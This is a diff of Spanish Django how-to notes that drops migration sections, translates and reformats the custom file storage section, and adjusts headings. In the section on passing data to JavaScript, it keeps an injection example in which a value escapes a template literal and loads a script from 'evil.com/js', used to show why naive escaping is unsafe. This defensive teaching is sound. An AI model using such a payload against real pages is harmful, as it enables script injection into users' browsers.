@@ -190,113 +190,6 @@ Donde ``app`` es la etiqueta de la app, y ``model`` el nombre del
 modelo, y ``pk`` es la clave primaria del objeto.
 
 
-Cómo migrar a 3.1.1
-------------------------------------------------------------------------
-
-**NullBooleanField** está obsoleto, ha sido reemplazado por
-   ``BooleanField(null=True)``
-
-Tanto ``load staticfiles`` como ``load admin_static`` están obsoletos desde
-Django 2.1, deprecado en Django 3.0.
-
-Cambiar este tipo de referencias en las plantilla:
-
-.. code:: django
-
-   {% load staticfiles %}
-   {% load static from staticfiles %}
-   {% load admin_static %}
-
-a:
-
-.. code:: django
-
-   {% load static %}
-
-
-Como migrar a 4.xx
-------------------------------------------------------------------------
-
-Ya no se puede usar la funcion ``url`` para especificar patrones, hay
-que usar obligatoriamente ``path`` o ``path_re``.
-
-Si da problemas con CSRF, hay que añadir la siguiente variable al
-``settings.py``:
-
-.. code:: python
-
-   CSRF_TRUSTED_ORIGINS = [
-           'https://subdomain.example.com',
-           'https://*.blob.com',
-           ...
-       ]
-
-Por defecto es una lista vacía. Los valores en las versiones
-anteriores a la 4 puede que estuvieran sin el esquema, y seguramente
-sin poder usar asteriscos.
-
-Fuente: `CSRF_TRUSTED_ORIGINS - Django
-   settings <https://docs.djangoproject.com/en/4.0/ref/settings/#csrf-trusted-origins>`__
-
-Cómo migrar a 6.xx
-------------------------------------------------------------------------
-
-Since Django’s inception, the web has gradually moved from HTTP to
-HTTPS, a welcome move for security. But the history has meant older
-parts of Django have had a lingering HTTP bias. Many of these have been
-migrated to default to HTTPS instead in previous versions. Django 5.0
-starts the migration of another, tiny HTTP bias in forms.URLField.
-
-The old behaviour: when URLField is provided a URL without a scheme, it
-assumes it to be “http”:
-
-.. code:: python
-
-   from django import forms
-
-   assert forms.URLField().to_python('example.com') == 'http://example.com'
-
-Django 5.0 has started a deprecation process to change this default to
-"https"
-
-Here’s that warning message in a more readable format:
-
-   RemovedInDjango60Warning: The default scheme will be changed from
-   ‘http’ to ‘https’ in Django 6.0. Pass the
-   ``forms.URLField.assume_scheme argument`` to silence this warning, or
-   set the ``FORMS_URLFIELD_ASSUME_HTTPS`` transitional setting to True
-   to opt into using ‘https’ as the new default scheme.
-
-Django 5.1 lo trata como un ``DeprecationWarning`` pero en Django 6.0
-cambiará el valor por defecto y eliminara el aviso.
-
-Hasta Django 6.0, seguirá existiendo el aviso. Esto se puede controlar
-de dos maneras:
-
--  Adoptar el comportamiento futuro con el valor de configuración
-   ``FORMS_URLFIELD_ASSUME_HTTPS``.
-
-   ::
-
-      FORMS_URLFIELD_ASSUME_HTTPS = True
-
-   Esto hará que **todos** los campos de tipo URLField asumen que el
-   esquema por defecto es ``https``.
-
--  Migrar individualmente los campos de tipo ``forms.URLField``
-   añadiendo el esquema por defecto.
-
-   Con esta opcion, hay que aãdir el parámetro opcional
-   ``assume_schema`` a cada instancia de ``URL Field``. Se puede ajustar
-   el valor a ``https``, que el el comportamiento futuro por defecto, o
-   ``http`` para mantener el comportamiento anterior.
-
-De cualquiera de las dos maneras desactivaremos el aviso.
-
-Fuente: `Django: Fix version 5.0’s URLField.assume_scheme warnings -
-Adam
-Johnson <https://adamj.eu/tech/2023/12/07/django-fix-urlfield-assume-scheme-warnings/>`__
-
 Configurar VIM para trabajar con plantillas de Django
 -----------------------------------------------------
 
@@ -1103,25 +996,26 @@ Cómo escribir un sistema de almacenamiento propio
 
 Source: https://docs.djangoproject.com/en/3.2/howto/custom-file-storage/
 
-If you need to provide custom file storage – a common example is storing
-files on some remote system – you can do so by defining a custom storage
-class. You’ll need to follow these steps:
+Si se necesita porporcionar un almacanmiento de archivos
+personalizado, por ejemplo, para almacenar los ficheros en un CDN
+remoto, que es un caso comúm, se puede hacer fácilmente, siguiendo los
+siguientes pasos:
 
-Your custom storage system must be a subclass of
-django.core.files.storage.Storage:
+- Tu implementación de un almacenamiento personalizado **debe derivar de
+  ``django.core.files.storage.Storage``**:
 
-::
+.. code:: python
 
    from django.core.files.storage import Storage
 
    class MyStorage(Storage):
        ...
 
-Django debe ser capaz de instanciar esta clase sin necesidad de ningún
-parámetro. En caso necesario, lo recomendado es que lea esos valores
-desde el fichero de configuración.
+- Django debe ser capaz de instanciar esta clase **sin necesidad de
+  ningún parámetro**. En caso necesario, lo recomendado es que lea esos
+  valores desde el fichero de configuración.
 
-::
+.. code:: python
 
    from django.conf import settings
    from django.core.files.storage import Storage
@@ -1132,23 +1026,21 @@ desde el fichero de configuración.
                option = settings.CUSTOM_STORAGE_OPTIONS
            ...
 
-Your storage class must implement the ``_open()`` and ``_save()``
-methods, along with any other methods appropriate to your storage class.
-See below for more on these methods.
+- La clase debe implementar los métodos ``_open()`` y ``_save()``.
 
-In addition, if your class provides local file storage, it must override
-the ``path()`` method.
+- Además, si tu clase almacena los ficheros localmente, se debe
+  sobreescribir el método ``path()``.
 
-Your storage class must be **deconstructible** so it can be serialized
-when it’s used on a field in a migration. As long as your field has
-arguments that are themselves serializable, you can use the
-django.utils.deconstruct.deconstructible class decorator for this
-(that’s what Django uses on FileSystemStorage).
+- Your storage class must be **deconstructible** so it can be serialized
+  when it’s used on a field in a migration. As long as your field has
+  arguments that are themselves serializable, you can use the
+  django.utils.deconstruct.deconstructible class decorator for this
+  (that’s what Django uses on FileSystemStorage).
 
-By default, the following methods raise ``NotImplementedError`` and will
-typically have to be overridden:
+  By default, the following methods raise ``NotImplementedError`` and
+  will typically have to be overridden:
 
-::
+.. code:: python
 
    Storage.delete()
    Storage.exists()
@@ -1174,7 +1066,7 @@ interface.
 You’ll also usually want to use hooks specifically designed for custom
 storage objects. These are:
 
-::
+.. code:: python
 
    _open(name, mode='rb')
 
@@ -1185,7 +1077,7 @@ class uses to open the file. This must return a File object, though in
 most cases, you’ll want to return some subclass here that implements
 logic specific to the backend storage system.
 
-::
+.. code:: python
 
    _save(name, content)
 
@@ -1197,7 +1089,7 @@ Should return the actual name of name of the file saved (usually the
 name passed in, but if the storage needs to change the file name return
 the new name instead).
 
-::
+.. code:: python
 
    get_valid_name(name)
 
@@ -1212,7 +1104,7 @@ The code provided on Storage retains only alpha-numeric characters,
 periods and underscores from the original filename, removing everything
 else.
 
-::
+.. code:: python
 
    get_alternative_name(file_root, file_ext)
 
@@ -1221,7 +1113,7 @@ Returns an alternative filename based on the ``file_root`` and
 character alphanumeric string is appended to the filename before the
 extension.
 
-::
+.. code:: python
 
    get_available_name(name, max_length=None)
 
@@ -1239,384 +1131,9 @@ If a file with name already exists, ``get_alternative_name()`` is called
 to obtain an alternative name.
 
 
-Cómo hacer migraciones propias en Django
-------------------------------------------------------------------------
-
-Podemos crear nuestras propias migraciones. Este es realmente útil para
-cambios en las bases de datos que ya estén en producción.
-
-Primero creamos una migración vacía (*empty*):
-
-.. code:: shell
-
-   ./manage.py makemigrations --empty --name nombre_que_quieras_para_la_migracion app_name
-
-Esto creará un fichero de migración, que no hace nada, con un contenido
-similar a este:
-
-.. code:: python
-
-   # Generated by Django 3.2.12 on 2022-03-22 09:04
-
-   from django.db import migrations
-
-
-   class Migration(migrations.Migration):
-
-       dependencies = [
-           ('agora', '0003_alter_table_add_field_flag'),
-       ]
-
-       operations = [
-       ]
-
-Como vemos, solo se define el campo de dependencias, las operaciones a
-realizar en esta migración están vacías. Vamos a incluir código SQL para
-crear la secuencia:
-
-.. code:: sql
-
-   CREATE SEQUENCE Agora.seq_foto_diputado START WITH 1 INCREMENT BY 1;
-
-Para ello haremos uso de la clase
-`migration.RunSQL <https://docs.djangoproject.com/en/1.10/ref/migration-operations/#runsql>`__,
-que nos permite definir la migración tanto en una dirección como en
-otra, es decir, crearemos este objeto con dos sentencias SQL, una para
-definir como aplicar la migración, y otra para deshacerla. En nuestro
-caso, quedaría así:
-
-.. code:: python
-
-   # Generated by Django 3.2.12 on 2022-03-22 09:04
-
-   from django.db import migrations
-
-
-   class Migration(migrations.Migration):
-
-       dependencies = [
-           ('agora', '0003_asunto_bop_cargo_claseiniciativa_composicion_diputado_diputadogrupo_ds_dsc_dsdp_fotodiputado_grupopa'),
-       ]
-
-       operations = [
-           migrations.RunSQL(
-               'CREATE SEQUENCE Agora.seq_foto_diputado START WITH 1 INCREMENT BY 1',
-               'DROP SEQUENCE Agora.seq_foto_diputado',
-           )
-       ]
-
-Fuentes:
-
-- `Executing Custom SQL in Django Migrations`_ - End Point Dev
-
-- `A Pony On The Move: How Migrations Work In Django`_ - DjangoCon.eu - Porto - 2020
-
-.. _`A Pony On The Move: How Migrations Work In Django`: https://www.youtube.com/watch?v=u6cVvbuUzlk
-.. _Executing Custom SQL in Django Migrations: https://www.endpointdev.com/blog/2016/09/executing-custom-sql-in-django-migration/
-
-Cómo crear migraciones propias usando código Python en vez de SQL
-------------------------------------------------------------------------
-
-Si las migraciones usando solo SQL se quedan cortas, también podemos
-hacer migraciones personalizadas que usen código Python e incluso, con
-ciertas limitaciones, nuestro código ya existente.
-
-Para ello, en vez de usar la clase ``RunSQL`` usaremos la clase
-``RunPython``. Esta clase espera un *callable*, normalmente una función.
-Esta función debe aceptar dos parámetros: el primero es un registro que
-mantiene los versiones a lo largo de la historia de todos los modelos,
-de forma que podamos acceder al modelo tal y como era en la evolución
-del proyecto. El segundo parámetro es una instancia de a clase
-``SchemaEdior``, que se puede usar para realizar cambios manuales en el
-esquema de la base de datos (Pero que no es recomendable usar, ya que
-puede confundir, y mucho, al sistema de migraciones).
-
-Veamos un ejemplo, en el que calculamos la letra inicial, normalizada,
-de un texto y lo almacenamos en otro campo. Esto puede ser útil a
-efectos de filtrar y clasificar las entradas:
-
-.. code:: py
-
-   from django.db import migrations
-
-
-   def make_inicial(text):
-       if text:
-           normaliza_table = str.maketrans("ÁÉÍÓÚ", "AEIOU")
-           char = text[0].upper()
-           return char.translate(_normaliza_table)
-       return ''
-
-
-   def set_inicial(apps, schema_editor):
-       # No podemos usar el modelo Entrada directamente, porque puede
-       # que a estas alturas exista una version posterior al modelo
-       # que espera la migración. Por eso tenemos que _viajar en el tiempo_
-       # y cargar elmodelo que se corresponda con el momento histórico
-       # de esta migración.
-       Ejemplo = apps.get_model("dc2", "Ejemplo")
-       for ejemplo in Ejemplo.objects.filter(inicial=None):
-           ejemplo.inicial = make_inicial(ejemplo.entrada)
-           ejemplo.save()
-
-
-   class Migration(migrations.Migration):
-       dependencies = [
-           ("dc2", "0001_initial"),
-       ]
-
-       operations = [
-           migrations.RunPython(set_inicial),
-       ]
-
-Al igual que con ``RunSQL``, podemos implementar la operación que
-deshaga este cambio, y pasarla como segundo parámetro. Si hacemos esto
-con todas nuestras migraciones personales (Las automáticas lo realizan
-siempre), podemos viajar atrás y adelante en la historia del esquema de
-la base de datos, que puede ser una capacidad interesante. Para el
-ejemplo anterior, quedaría así:
-
-.. code:: py
-
-   from django.db import migrations
-
-
-   def make_inicial(text):
-       if text:
-           normaliza_table = str.maketrans("ÁÉÍÓÚ", "AEIOU")
-           char = text[0].upper()
-           return char.translate(_normaliza_table)
-       return ''
-
-
-   def set_inicial(apps, schema_editor):
-       # No podemos usar el modelo Entrada directamente, porque puede
-       # que a estas alturas exista una version posterior a el modelo
-       # que espera la migración. Por eso tenemos que _viajar en el tiempo_
-       # y cargar elmodelo que se corresponda con el momento histórico
-       # de esta migración.
-       Ejemplo = apps.get_model("dc2", "Ejemplo")
-       for ejemplo in Ejemplo.objects.filter(inicial=None):
-           ejemplo.inicial = make_inicial(ejemplo.entrada)
-           ejemplo.save()
-
-
-   def unset_inicial(apps, schema_editor):
-       Ejemplo = apps.get_model("dc2", "Ejemplo")
-       for ejemplo in Ejemplo.objects.exclude(inicial=None):
-           ejemplo.inicial = None
-           ejemplo.save()
-
-
-
-   class Migration(migrations.Migration):
-       dependencies = [
-           ("dc2", "0001_initial"),
-       ]
-
-       operations = [
-           migrations.RunPython(set_inicial, unset_inicial),
-       ]
-
-
-Cómo condensar/simplificar (*squash*) las migraciones en Django
-------------------------------------------------------------------------
-
-Existe una opción en el ``manage.py`` llamada **``squashmigrations``**
-que nos permite condensar todas las migraciones aplicadas (o un
-subconjunto de ellas) de forma que se sustituyan por una única
-migración. Además, intenta optimizar las migraciones al mezclarlas, de
-forma que se eliminan los cambios que son sobrescritos por migraciones
-posteriores.
-
-Por ejemplo, si tenemos una acción de tipo ``CreateModel()`` y más tarde
-aparece otra de tipo ``DeleteModel()`` para el mismo modelo, se pueden
-eliminar no solo las dos acciones indicadas, sino también cualquier
-acción intermedia que modifique al modelo.
-
-Igualmente, acciones como ``AlterField()`` o ``AddField()`` son
-trasladadas a la versión final de la acción ``CreateModel``.
-
-La versión final condensada también mantiene referencias al conjunto de
-migraciones que reemplaza. De esa forma Django puede entender cosas como
-el histórico de grabaciones o las dependencias entre migraciones.
-
-Django enumera de forma automática los ficheros de migraciones,
-partiendo de ``0001_initial.py``. De esa forma puede determinar el orden
-de aplicación de las migraciones, y nosotros podemos usarlo para indicar
-el conjunto de las migraciones que queremos condensar, en forma de
-rango.
-
-Por ejemplo, supongamos que tenemos la siguiente lista de migraciones:
-
-::
-
-   ./foo
-       ./migrations
-           0001_initial.py
-           0002_userprofile.py
-           0003_article_user.py
-           0004_auto_20190101_0123.py
-
-En la mayoría de los casos, querríamos condensarlas todas en un único
-fichero. Para ello, ejecutamos la siguiente orden:
-
-.. code:: shell
-
-   python manage.py squashmigrations foo 0004
-
-El resultado será condensar todas las migraciones, desde la 1 hasta la
-4, generando una nueva migración con el nombre:
-``0001_squashed_0004_auto_<timestamp>.py``
-
-Si examinamos este fichero, descubriremos dos cosas interesantes:
-
--  La nueva migración está marcada como ``initial=True``, lo que
-   significa que sera la nueva migración inicial de esta aplicación. Si
-   se aplicara en una nueva base de datos, las migraciones anteriores se
-   ignorarían.
-
--  Se ha añadido un nuevo atributo, ``replaces``, que es una lista de
-   las migraciones que son reemplazadas por esta.
-
-Fuentes:
-
--  `How to Squash and Merge Django Migrations ·
-   Coderbook <https://coderbook.com/@marcus/how-to-squash-and-merge-django-migrations/>`__
-
-Cómo *resetear* las migraciones
-------------------------------------------------------------------------
-
-A veces, especialmente al principio del desarrollo, damos varios pasos
-en falso hasta que la estructura de la base de datos queda más o menos
-bien establecida. Esto puede provocar una serie de migraciones que no
-aportan nada realmente. En estos casos, puede ser útil **resetar
-todas las migraciones** y quedarnos con solo una migración inicial para
-cada *app* (O quizá solo algunas de ellas).
-
-Para hacer esto, tenemos que considerar dos escenarios posibles:
-
-- El proyecto todavía está en el entorno de desarrollo y se desea
-  una limpieza completa. No importa descartar toda la base de datos
-
-- Se quiere borrar todo el historial de migración, pero manteniendo
-  la base de datos existente.
-
-Veamos los dos casos.
-
-Escenario 1: Podemos descartar la base de datos
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-- Paso **Uno**: Quitar todos los archivos de migraciones dentro de
-  cada app. Revise cada una de las carpetas de migración de aplicaciones
-  de proyectos y elimine todo lo que hay dentro, excepto el fichero 
-  ``__init__.py``.
-
-- Paso **Dos**: Borrar la base de datos. Si es *sqlite*, el fichero
-  ``db.sqlite3``.
-
-- Paso **Tres**: Crear las migraciones iniciales y generar el 
-  esquema de la base de datos:
-
-    .. code:: 
-
-        python manage.py makemigrations
-        python manage.py migrate
-
-Y listo.
-
-Escenario 2: No queremos descartar la base de datos
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-- Paso **Uno**: Verificar que todos los modelos se ajustan al esquema
-  actual de la base de datos. La forma más fácil de hacerlo es tratando
-  de crear nuevas migraciones: ``python manage.py makemigrations``. Si
-  no hay ninguna, ya está. Si no, ejecutamos las migraciones primero.
-
-- Paso **Dos**: Borrar el historial de migración para cada aplicación.
-  Ahora hay que borrar la aplicación del historial de migración por 
-  aplicación. Esto es, la tabla ``django_migrations`` (En el paso
-  anterior no hay que hacer esto porque hemos borrado toda la base de
-  datos).
-
-  Para cada app: Borrar el historial de migración, ejecutar:
-
-  .. code:: shell
-
-        python manage.py migrate --fake <app> zero
-
-  Esto borrará el registro de migraciones para la app, sin hacer
-  realmente ningún otro cambio en la base de datos, por eso
-  es **muy importante** el *flag* ``--fake``.
-
-  El comando ``showmigrations`` debería mostrarnos todas las
-  migraciones de cada app, pero en estado "no aplicada".
-
-- Paso **Tres**: Quitar los archivos de migración reales.
-  Revisar cada una de las carpetas de migración de aplicaciones
-  de proyectos y eliminar todo lo que esté dentro, excepto el
-  fichero ``__init__.py``. El comando ``showmigrations`` debería
-  mostrarnos que no hay ninguna migración.
-
-- Paso **Cuatro**: Crear las migraciones iniciales
-
-  .. code:: python
-
-      python manage.py makemigrations
-
-  Que debe crear migraciones iniciales para cada una de las
-  aplicaciones.  
-
-- Paso **Cinco**: Falsificar la migración inicial. Como las tablas
-  de cada modelo realmente ya existen en la base de datos, lo único que
-  queda por hacer es marcar estas migraciones iniciales como ya
-  aplicadas, pero sin que realmente modifiquen el esquema. Si intentamos
-  aplicarlar realmente, nos darán problemas, por ejemplo al intentar
-  crear una tabla con ``CREATE TABLE ...`` cuando la tabla ya existe.
-  Por eso aplicamos el *flag** ``--fake``:
-
-  .. code:: shell
-
-      python manage.py migrate --fake-initial
-
-Fuente: `Django Reset Migrations`_
-
-Cómo usar la base de datos actual y librarme de migraciones anteriores
-------------------------------------------------------------------------
-
-Si sabe que sus modelos coinciden **totalmente** con el esquema
-existente, y que no hay migraciones generadas que necesiten ser
-contabilizadas (es decir, no ha creado ninguna migración de datos u
-otras migraciones a mano):
-
-- Haga una copia de seguridad de todo (incluida su base de datos de
-  producción)
-
-- eliminar todos los archivos de migración (pero mantener el directorio
-  y los archivos ``__init__.py``),
-
-- Crear una nueva base de datos
-
-- Cambie su proyecto para referirse a esa base de datos.
-
-- Ejecute ``makemigrations`` para crear un conjunto de migraciones que
-  describan sus modelos actuales.
-
-- Cambie su proyecto para consultar la base de datos de producción
-  original
-
-- Vacíe la tabla ``django_migrations`` de su base de datos de
-  producción
-
-- ejecutar migrar con la opción ``--fake`` (esta actualizará la tabla
-  ``django_migrations``)
-
-- Ejecute ``showmigrations`` para verificar que todas sus nuevas
-  migraciones iniciales se muestren como aplicadas.
-
 
 Cómo saber que base de datos se corresponde con cada modelo
------------------------------------------------------------
+-----------------------------------------------------------------------
 
 Si usamos *routers* para trabajar con múltiples bases de datos, hay una
 forma de preguntar, para un modelo dado y con la configuración definida
@@ -1661,13 +1178,13 @@ Fuente: `Creating forms from models \| Django
 documentation <https://docs.djangoproject.com/en/4.1/topics/forms/modelforms/#the-save-method>`__
 
 Cómo serializar un queryset
----------------------------
+------------------------------------------------------------------------
 
-Los *QuerySets* se pueden serializar con
-`pickle <https://docs.python.org/3/library/pickle.html>`__, y esto
-conlleva que la consulta es ejecutada y todos los resultados son
-almacenados también en la serializacion. Esto puede ser útil a efectos
-de *cachear* el *queryset*.
+Los *QuerySets* se pueden *serializar* con `pickle
+<https://docs.python.org/3/library/pickle.html>`__, y esto conlleva que
+la consulta es ejecutada y todos los resultados son almacenados también
+en la serialización. Esto puede ser útil a efectos de *cachear* el
+*queryset*.
 
 Obviamente, al recuperar el resultado, los registros obtenidos pueden
 diferir de los almacenados en ese momento en la base de datos.
@@ -1690,8 +1207,9 @@ el *queryset*, haríamos algo como esto:
    serializadas es aun más estricto: **No se puede compartir estos
    datos entre versiones diferentes de Django**.
 
+
 Cómo usar las validaciones en los formularios
----------------------------------------------
+------------------------------------------------------------------------
 
 Los formularios de Django soportan el uso de unas funciones/clases de
 validación, que en la documentación se denominan ``validators``, en
@@ -1731,7 +1249,7 @@ un formulario:
 
 Los validadores también se pueden aplicar a los modelos:
 
-::
+.. code:: python
 
    from django.db import models
 
@@ -1805,7 +1323,7 @@ determinados campos que los necesitan por defecto:
 -  ``validate_image_file_extension``
 
 Cómo tener dos aplicaciones con el mismo nombre
------------------------------------------------
+------------------------------------------------------------------------
 
 Desde Django 1.7, es obligatorio que las aplicaciones tengan una
 **etiqueta única** para identificarlos. Por defecto la etiqueta es el
@@ -1836,11 +1354,12 @@ documentación:
    definiendo una subclase de ``AppConfig``, mientras que otros se
    definen por Django y son de solo lectura.
 
+
 En Django 4.x las plantillas se cachean si DEBUG=true
------------------------------------------------------
+------------------------------------------------------------------------
 
 Todas las plantillas se cachean por defecto en Django a partir de la
-version 4, si el valor de ``settings.DEBUG`` es verdadero.
+versión 4, si el valor de ``settings.DEBUG`` es verdadero.
 
 De las notas de la version 4.1:
 
@@ -1850,7 +1369,7 @@ De las notas de la version 4.1:
 
 La solución es:
 
-.. code:: py
+.. code:: python
 
    default_loaders = [
        "django.template.loaders.filesystem.Loader",
@@ -1879,8 +1398,9 @@ Fuente: `Django 4.1+ HTML Templates Are Cached by Default with DEBUG =
 True — Nick
 Janetakis <https://nickjanetakis.com/blog/django-4-1-html-templates-are-cached-by-default-with-debug-true>`__
 
+
 Cómo incluir etiquetas y filtros propios en el sistema de plantillas
---------------------------------------------------------------------
+-----------------------------------------------------------------------
 
 Para no tener que usar ``{% load ... %}`` todo el rato.
 
@@ -1904,7 +1424,7 @@ variable ``TEMPLATES``, en el ``settings.py``:
    ]
 
 Para qué sirve la variable ``STATIC_ROOT``/``STATIC_FILES_DIR``
----------------------------------------------------------------
+-----------------------------------------------------------------------
 
 La respuesta es diferente según estemos en desarrollo o en producción.
 
@@ -1924,7 +1444,7 @@ que servir unos ficheros que están en un determinado directorio.
 
 Si ajustando el valor de ``STATIC_ROOT`` a ese directorio, digamos:
 
-.. code:: py
+.. code:: python
 
    STATIC_ROOT = '/algun/directorio/por/ahi/'
 
@@ -1948,8 +1468,9 @@ Fuente: `python - Differences between STATICFILES_DIR, STATIC_ROOT and
 MEDIA_ROOT - Stack
 Overflow <https://stackoverflow.com/questions/24022558/differences-between-staticfiles-dir-static-root-and-media-root>`__
 
-La tabla de sesiones de Django no para de crecer, como puedo solucionarlo
--------------------------------------------------------------------------
+
+Cómo solucionar que la tabla de sesiones de Django no pare de crecer
+------------------------------------------------------------------------
 
 Efectivamente,la tabla de sesiones no se limpia sola, están registradas
 todas las sesiones, incluyendo las expiradas, por lo que la tabla no
@@ -1974,8 +1495,9 @@ sigan activas, solo las que se han caducado.
 Fuente: `Why django session table growing automatically - Stack
 Overflow <https://stackoverflow.com/questions/71441352/why-django-session-table-growing-automatically>`__
 
+
 Cómo especificar, para un modelo, el nombre de la tabla en la BD
-----------------------------------------------------------------
+-----------------------------------------------------------------------
 
 Usando el atributo ``db_table`` de la clase ``Meta`` de modelo:
 
@@ -1991,8 +1513,8 @@ Usando el atributo ``db_table`` de la clase ``Meta`` de modelo:
        last_name = models.CharField(max_length=100)
        ...
 
-Cómo especificar, para un campo de un modelo, el nombre de la columna en la BD
-------------------------------------------------------------------------------
+Cómo especificar, para un campo de un modelo, su nombre en la BD
+-----------------------------------------------------------------------
 
 Con el parámetro ``db_column`` a la hora de definir el campo:
 
@@ -2003,8 +1525,9 @@ Con el parámetro ``db_column`` a la hora de definir el campo:
        login = models.CharField(max_length=100, db_column='username')
        ...
 
+
 Cómo subir contenido a un campo de tipo FileFied, por programa
---------------------------------------------------------------
+-----------------------------------------------------------------------
 
 Podemos usar el objeto ``File`` de ``django.core.files``. Supongamos un
 modelo:
@@ -2028,8 +1551,9 @@ Podemos hacer:
 Fuente: `Programmatically Upload Files in Django - Stack
 Overflow <https://stackoverflow.com/questions/1993939/programmatically-upload-files-in-django>`__
 
+
 Crear un FormField (y Widget por defecto, si fuera necesario) propio
---------------------------------------------------------------------
+-----------------------------------------------------------------------
 
 Los campos **de formulario** son fáciles de personalizar:
 
@@ -2073,8 +1597,9 @@ Esto es solo para personalizar los campos de formulario. para
 personalizar los *Widgets*, se requiere un poco más de trabajo porque
 hay que reimplementar unos cuantos métodos más.
 
+
 Mostrar el mensaje de ayuda (``help``) escribiendo comandos de Django
----------------------------------------------------------------------
+-----------------------------------------------------------------------
 
 Puedes llamar al método ``self.print_help``. Por ejemplo:
 
@@ -2095,8 +1620,9 @@ Fuentes:
 -  `How to Create Custom Django Management
    Commands <https://simpleisbetterthancomplex.com/tutorial/2018/08/27/how-to-create-custom-django-management-commands.html>`__
 
-¿Cuál es la utilidad de la variable ``app_name`` en el fichero ``urls.py``?
----------------------------------------------------------------------------
+
+¿Cuál es la utilidad de la variable ``app_name`` en ``urls.py``?
+-----------------------------------------------------------------------
 
 Cuando vamos a hacer un ``include`` de una fichero ``urls.py`` dentro de
 otro, hay dos formar de definir el **espacio de nombres** o
@@ -2116,10 +1642,11 @@ El segundo método es ahora mismo el recomendado.
 -  `Documentaión de
    Django <https://docs.djangoproject.com/en/dev/topics/http/urls/#url-namespaces-and-included-urlconfs>`__
 
-¿Para qué sirve la clase AppConfig?
------------------------------------
 
-Django mantien un **registro de aplicaciones instaladas**. En ese
+¿Para qué sirve la clase AppConfig?
+-----------------------------------------------------------------------
+
+Django mantiene un **registro de aplicaciones instaladas**. En ese
 registro se almacena aspectos de la configuración de cada *app*. El
 registro se llama ``apps`` y vive en ``django.apps``:
 
@@ -2128,17 +1655,17 @@ registro se llama ``apps`` y vive en ``django.apps``:
    from django.apps import apps
    print(apps.get_app_config('admin').verbose_name)
 
-**No** existe en Django una clase ``Aplicction`` que reprsente la *app*
-en si, pero lo que más se parece serian los objetos que se almacenan en
-este repositorio, que son instancias (directa o indirectamente) de
-``AppConfig``.
+**No** existe en Django una clase ``Apliccation`` que represente la
+*app* en si, pero lo que más se parece serian los objetos que se
+almacenan en este repositorio, que son instancias, directas o
+indirectas, de ``AppConfig``.
 
 Para configurar una aplicación, tenemos que crear un fichero
 ``apps.py``, y dentro del mismo definir una clase de ``AppConfig`` (La
 utilidad de línea ``startapp`` crea una automáticamente). Para cualquier
 entrada en ``INSTALLED_APPS``, si es una especificación de ruta al
-estilo Python (Con puntos ``.`` en vez del separador de direcotorios),
-Django busca dentro de esa ruta el fichero ``apps.py`` y, sii lo
+estilo Python (Con puntos ``.`` en vez del separador de directorios),
+Django busca dentro de esa ruta el fichero ``apps.py`` y, si lo
 encuentra, busca que haya una única clase derivada de ``AppConfig``. Si
 encuentra una y solo una, se usa esa clase para configurar la
 aplicación. Si encuentra varias, Django buscara la que tenga la
@@ -2146,7 +1673,7 @@ propiedad ``default`` a ``True``. Si no se encuentra ninguna, se usará
 la clase base ``AppConfig``.
 
 De forma alternativa, podemos tener en la lista ``INSTALLED_APPS``
-directamente especificada la clase de configuracion. Por ejemplo:
+directamente especificada la clase de configuración. Por ejemplo:
 
 .. code:: python
 
@@ -2160,13 +1687,13 @@ Las características más interesantes que hay que definir en esta clase
 son:
 
 -  El **identificador** de la *app*, que definiremos con el atributo
-   ``name``
+  ``name``
 
 -  El **nombre publido**, que definiremos con ``verbose_name``.
 
 Por ejemplo, si tenemos el fichero ``rock_n_roll/apps.py``:
 
-::
+.. code:: python
 
    # rock_n_roll/apps.py
 
@@ -2179,12 +1706,14 @@ Por ejemplo, si tenemos el fichero ``rock_n_roll/apps.py``:
 Cuando Django encuentre la etiqueta ``rock_n_roll``, se usara como
 configuración la de esta clase.
 
+
 Cómo pasar datos de forma segura desde Django a Javascript
-----------------------------------------------------------
+-----------------------------------------------------------------------
 
 Hay dos técnicas:
 
 -  Usar atributos en marcas Html para datos sencillos
+
 -  Usar ``json_script`` para datos complejos
 
 La primera idea puede ser la de usar el propio sistema de plantillas de
@@ -2197,9 +1726,10 @@ Django, por ejemplo, haciendo:
        const username = "{{ username }}";
    </script>
 
-Es mejor **evitar siempre esta opción**. Django por defecto escapa los
-valores en las plantillas, así que si ``username`` fuera, por ejemplo
-``"Adam <3"``, la salida en la plantilla sería:
+Es mejor **evitar esta opción**, excepto para casos muy sencillos.
+Django por defecto escapa los valores en las plantillas, así que si
+``username`` fuera, por ejemplo ``"Adam <3"``, la salida en la plantilla
+sería:
 
 .. code:: html
 
@@ -2208,10 +1738,8 @@ valores en las plantillas, así que si ``username`` fuera, por ejemplo
    </script>
 
 Otro peligro relacionado con esto sería la posibilidad de `inyección de
-código <https://es.wikipedia.org/wiki/Inyecci%C3%B3n_de_c%C3%B3digo>`__,
-especialmente si se usan `plantillas literales de
-javascript <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals>`__.
-En el siguiente ejemplo:
+código`_, especialmente si se usan `plantillas literales de
+javascript`_, como en el siguiente ejemplo:
 
 .. code:: html
 
@@ -2236,18 +1764,16 @@ Entonces la salida final sería:
        const greeting = `Hi a`; document.body.appendChild(document.createElement(`script`)).src = `evil.com/js`;``;
    </script>
 
-El sistema de plantillas de Django está pensado para escapar Html, no
-para *Javascript*, que tiene un sintaxis mucho más compleja.
+El sistema de plantillas de Django está pensado para escapar HTML, no
+para Javascript, que tiene un sintaxis mucho más compleja.
 
 Descartado esto, veamos pues las dos opciones que tenemos:
 
 Usar atributos de datos en etiquetas Html
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Para datos simple, se pueden usar `atributos de
-datos <https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes>`__,
-que son atributos genéricos cuyo nombre empiece por ``data-``. Por
-ejemplo:
+Para datos simple, se pueden usar `atributos de datos`_, que son
+atributos genéricos cuyo nombre debe empezar por ``data-``. Por ejemplo:
 
 .. code:: html
 
@@ -2259,7 +1785,7 @@ ejemplo:
 Con ``document.currentScript`` podemos acceder simple y rápidamente a
 los atributos de datos del *script* actual. La propiedad ``dataset``
 contiene los valores pasados en forma de texto. Esto puede ser usado
